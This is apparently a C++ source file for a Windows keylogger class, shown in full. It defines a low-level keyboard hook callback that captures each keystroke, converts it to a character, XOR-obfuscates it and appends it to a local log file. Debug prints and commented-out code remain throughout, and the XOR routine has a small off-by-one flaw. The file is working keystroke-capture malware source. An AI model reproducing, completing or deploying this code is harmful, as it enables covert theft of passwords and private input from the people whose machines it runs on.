#include <keylogger.h>

std::ofstream Keylogger::kblog;
wchar_t* Keylogger::key = nullptr;

Keylogger::Keylogger(wchar_t* k) {
    // DWORD sessionId;
    // ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    // std::cerr << "Process ID: " << GetCurrentProcessId() << '\n';
    // std::cerr << "Session ID: " << sessionId << '\n';

    // wchar_t username[256];
    // DWORD size = 256;

    // if (GetUserNameW(username, &size)) {
    //     std::wcout << L"Username: " << username << std::endl;
    // }

    // HANDLE hFile = CreateFileW(
    //     L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
    //     GENERIC_WRITE,
    //     FILE_SHARE_READ | FILE_SHARE_WRITE,
    //     NULL,
    //     OPEN_ALWAYS,
    //     FILE_ATTRIBUTE_NORMAL,
    //     NULL
    // );

    // if (hFile == INVALID_HANDLE_VALUE)
    // {
    //     std::cerr << "CreateFileW FAILED: "
    //               << GetLastError() << '\n';
    // }
    // else
    // {
    //     std::cerr << "CreateFileW SUCCESS\n";
    //     CloseHandle(hFile);
    // }

    // errno = 0;

    kblog = std::ofstream("kb_log.txt", std::ios::app);

    std::cerr << "After OPEN: " << kblog.is_open() << std::endl;

    kblog << "Constructor test\n";
    kblog.flush();

    std::cerr << "After write: " << kblog.good() << std::endl;

    std::cerr << "errno: " << errno << '\n';
    std::cerr << "error: " << strerror(errno) << '\n'; 

    std::cout << "------------------------------------------" << std::endl;
    std::ofstream test(
    "C:\\Users\\Public\\ofstream_test.txt",
    std::ios::out | std::ios::app
    );

    std::cerr << "Public file: " << test.is_open() << '\n';

    key = k;
}

Keylogger::~Keylogger() {
    kblog.close();
}

void Keylogger::XOR(wchar_t* data, int data_len, wchar_t* key, int key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

wchar_t* Keylogger::vk2ascii(UINT vkCode) {
    static WCHAR buffer[16] = {};

    BYTE keyboardState[256];
    for (int i = 0; i < 256; i++) {
        keyboardState[i] = (BYTE)GetKeyState(i);
    }

    ZeroMemory(buffer, sizeof(buffer));

    UINT scanCode = MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0x04);

    if (result <= 0) return nullptr;

    buffer[result] = L'\0';

    return buffer;
}

LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

    std::cerr << "Keyboard Callback Fired!" << std::endl;

    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            DWORD vkCode = pKeyStruct->vkCode;
            wchar_t* character = vk2ascii(vkCode);

            std::cerr << "Is open: " << kblog.is_open() << std::endl;
            std::cerr << "Good: " << kblog.good() << std::endl;

            if (character != nullptr) {
                XOR(character, lstrlenW(character), key, lstrlenW(key));
                kblog << static_cast<char>(*character) << std::endl;
            }
        } 
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}